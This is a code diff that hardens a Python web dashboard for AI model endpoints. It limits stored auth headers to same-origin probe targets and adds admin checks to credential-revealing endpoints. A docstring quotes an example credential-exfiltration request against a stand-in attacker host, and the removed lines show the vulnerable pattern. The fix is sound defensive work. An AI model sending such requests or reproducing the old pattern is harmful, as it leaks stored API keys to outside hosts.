@@ -217,26 +217,41 @@ async def get_discovery():
     return {"state": discovery.STATE, "items": items}
 
 
-def _svc_headers(svc: int | None) -> dict | None:
-    """Stored auth header for a service (server-side only; never returned as-is)."""
+def _svc_headers(svc: int | None, url: str) -> dict | None:
+    """Stored auth header for a service — attached ONLY when the probe target
+    has the same origin as the service's stored URL. Kills the
+    'GET /api/inspect?url=http://attacker/&svc=14' credential-exfil primitive
+    (the key can only ever be sent where it already belongs)."""
     if not svc:
         return None
     s = db.get_service(svc)
-    if s and s.get("header_name"):
-        return {s["header_name"]: s.get("header_value") or ""}
-    return None
+    if not (s and s.get("header_name")):
+        return None
+    try:
+        stored = urlparse(s["url"] if "://" in s["url"] else "http://" + s["url"])
+        target = urlparse(url if "://" in url else "http://" + url)
+        if (stored.hostname, stored.port) != (target.hostname, target.port):
+            return None  # origin mismatch: never leak the credential off-box
+    except ValueError:
+        return None
+    return {s["header_name"]: s.get("header_value") or ""}
 
 
 @app.get("/api/inspect")
 async def inspect_endpoint(url: str, svc: int | None = None):
     """Live endpoint deep-probe: identity, version, served models, path map."""
-    return await discovery.inspect_endpoint(url, _svc_headers(svc))
+    if url.split("://")[0] not in ("", "http", "https"):
+        raise HTTPException(422, "only http(s) URLs may be probed")
+    return await discovery.inspect_endpoint(url, _svc_headers(svc, url))
 
 
 @app.get("/api/harness-config")
-async def harness_config(url: str, svc: int | None = None):
-    """Everything an AI harness needs to use this model endpoint."""
-    headers = _svc_headers(svc)
+async def harness_config(request: Request, url: str, svc: int | None = None):
+    """Everything an AI harness needs to use this model endpoint.
+    Privileged: may reveal the service's stored key to the dashboard UI."""
+    if not mcp_hub.admin_ok(request):
+        return mcp_hub.unauthorized()
+    headers = _svc_headers(svc, url)
     api_key = None
     if headers:
         v = next(iter(headers.values()), "")
@@ -297,6 +312,8 @@ async def dismiss_discovery(did: int):
 
 @app.get("/api/export")
 async def export_registry(request: Request, secrets: bool = False):
+    if not mcp_hub.admin_ok(request):
+        return mcp_hub.unauthorized()
     data = db.export_services(include_secrets=bool(secrets))
     data["secrets_included"] = bool(secrets)
     return JSONResponse(data, headers={
@@ -304,7 +321,9 @@ async def export_registry(request: Request, secrets: bool = False):
 
 
 @app.post("/api/import")
-async def import_registry(body: dict):
+async def import_registry(body: dict, request: Request):
+    if not mcp_hub.admin_ok(request):
+        return mcp_hub.unauthorized()
     services = body.get("services")
     if not isinstance(services, list):
         raise HTTPException(422, "expected {services: [...]}")
